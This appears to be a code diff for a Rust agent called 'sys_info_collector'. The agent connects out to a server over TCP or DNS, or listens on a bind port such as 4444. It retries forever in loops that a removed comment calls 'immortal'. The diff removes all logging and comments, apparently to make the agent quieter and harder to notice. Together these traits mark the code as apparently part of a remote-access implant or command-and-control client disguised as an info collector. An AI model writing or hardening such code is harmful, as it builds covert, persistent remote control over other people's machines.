@@ -201,17 +201,9 @@ async fn run_tcp_mode() -> Result<()> {
     use sys_info_collector::handler::MessageHandler;
     use sys_info_collector::transport::{create_transport, Transport};
     
-    // 获取服务器 URL
     let server_url = get_server_url();
-    
-    // 构造 TCP URL
-    // 支持多种输入格式： 
-    // 1. "127.0.0.1:8080" -> "tcp://127.0.0.1:8080"
-    // 2. "tcp://127.0.0.1:8080" -> "tcp://127.0.0.1:8080"
-    // 3. "ws://127.0.0.1:8080/ws" -> "tcp://127.0.0.1:8080"
     let mut clean_url = server_url.clone();
     
-    // 移除已知的协议前缀
     if clean_url.starts_with("ws://") {
         clean_url = clean_url.replace("ws://", "");
     } else if clean_url.starts_with("wss://") {
@@ -220,32 +212,17 @@ async fn run_tcp_mode() -> Result<()> {
         clean_url = clean_url.replace("tcp://", "");
     }
 
-    // 如果包含路径 (例如 /ws)，只保留主机和端口部分
     if let Some(pos) = clean_url.find('/') {
         clean_url = clean_url[..pos].to_string();
     }
     
-    // 最终组合成标准的 tcp://host:port
     let tcp_url = format!("tcp://{}", clean_url);
     
-    info!("TCP Configuration:");
-    info!("  Original URL: {}", server_url);
-    info!("  Final TCP URL: {}", tcp_url);
-    info!("===========================================");
-    
-    // 创建 TCP 传输层
     let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
-        Ok(t) => {
-            info!("TCP transport layer created successfully");
-            t
-        }
-        Err(e) => {
-            error!("Failed to create TCP transport: {}", e);
-            return Err(e);
-        }
+        Ok(t) => t,
+        Err(e) => return Err(e),
     };
     
-    // "永生"循环
     loop {
         if let Err(_) = transport.connect().await {
             tokio::time::sleep(tokio::time::Duration::from_secs(15)).await;
@@ -285,29 +262,10 @@ async fn run_dns_mode() -> Result<()> {
     use sys_info_collector::handler::MessageHandler;
     use sys_info_collector::transport::{create_transport, Transport};
     
-    // 获取服务器 URL
     let server_url = get_server_url();
     
-    // 显示 DNS 配置
-    info!("DNS Configuration:");
-    info!("  Domain: {}", server_url);
-    
-    if let Some(_resolver) = get_dns_resolver() {
-        // DNS resolver configured
-    } else {
-        // Using default DNS resolver
-    }
-    
-    info!("===========================================");
-    
-    // 构造 DNS URL
-    // 支持多种输入格式：
-    // 1. "example.com" -> "dns://example.com"
-    // 2. "dns://example.com" -> "dns://example.com"
-    // 3. "ws://example.com/ws" -> "dns://example.com"
     let mut clean_url = server_url.clone();
     
-    // 移除已知的协议前缀
     if clean_url.starts_with("ws://") {
         clean_url = clean_url.replace("ws://", "");
     } else if clean_url.starts_with("wss://") {
@@ -316,27 +274,17 @@ async fn run_dns_mode() -> Result<()> {
         clean_url = clean_url.replace("dns://", "");
     }
 
-    // 如果包含路径 (例如 /ws)，只保留主机部分
     if let Some(pos) = clean_url.find('/') {
         clean_url = clean_url[..pos].to_string();
     }
     
-    // 最终组合成标准的 dns://domain
     let dns_url = format!("dns://{}", clean_url);
     
-    // 创建 DNS 传输层
     let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
-        Ok(t) => {
-            info!("DNS transport layer created successfully");
-            t
-        }
-        Err(e) => {
-            error!("Failed to create DNS transport: {}", e);
-            return Err(e);
-        }
+        Ok(t) => t,
+        Err(e) => return Err(e),
     };
     
-    // "永生"循环
     loop {
         if let Err(_) = transport.connect().await {
             tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
@@ -374,7 +322,6 @@ async fn run_bind_mode() -> Result<()> {
     use sys_info_collector::handler::MessageHandler;
     use sys_info_collector::transport::{create_transport, Transport};
 
-    // 在 Bind 模式下，"Server URL" 实际上解析为监听地址，例如 "0.0.0.0:4444"
     let bind_addr = get_server_url();
     let bind_url = if bind_addr.contains("://") {
         bind_addr.replace("ws://", "bind://").replace("tcp://", "bind://")
@@ -382,28 +329,20 @@ async fn run_bind_mode() -> Result<()> {
         format!("bind://{}", bind_addr)
     };
 
-    info!("TCP Bind Configuration:");
-    info!("  Listen address: {}", bind_url);
-
     let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;
 
     loop {
-        info!("Waiting for incoming TCP connection...");
-        if let Err(e) = transport.connect().await {
-            error!("Bind listen failed: {}. Retrying in 5s...", e);
+        if let Err(_) = transport.connect().await {
             tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
             continue;
         }
 
-        info!("Connection accepted, starting message handler...");
         let handler = MessageHandler::new(transport);
         match handler.run().await {
             Ok(returned_transport) => {
-                info!("Bind session ended normally.");
                 transport = returned_transport;
             }
-            Err(e) => {
-                error!("Bind session error: {}. Restarting listener...", e);
+            Err(_) => {
                 transport = create_transport(&bind_url)?;
             }
         }
